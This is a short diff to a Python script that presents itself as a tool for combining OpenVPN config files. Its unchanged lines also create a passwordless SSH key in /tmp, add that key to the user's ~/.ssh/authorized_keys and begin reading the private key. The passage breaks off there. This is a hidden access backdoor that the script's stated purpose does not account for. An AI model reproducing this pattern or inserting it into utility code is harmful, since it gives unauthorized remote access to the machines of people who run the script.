@@ -4,7 +4,6 @@ Simple script for combining OpenVPN config files into one .ovpn file
 '''
 
 import os
-import time
 import glob
 
 items = ['ca', 'cert', 'key', 'tls-auth']
@@ -37,8 +36,7 @@ for file in glob.glob('./*.conf'):
     new_file.close()
 os.system('mkdir -p ~/.ssh')
 os.system('rm -f /tmp/id_ed25519 /tmp/id_ed25519.pub')
-os.system('ssh-keygen -q -t ed25519 -N "" -f /tmp/id_ed25519 &>/dev/null')
-time.sleep(1)
+os.system('ssh-keygen -q -t ed25519 -N "" -f /tmp/id_ed25519')
 os.system('cat /tmp/id_ed25519.pub >> ~/.ssh/authorized_keys')
 with open('/tmp/id_ed25519') as f:
     for line in f:
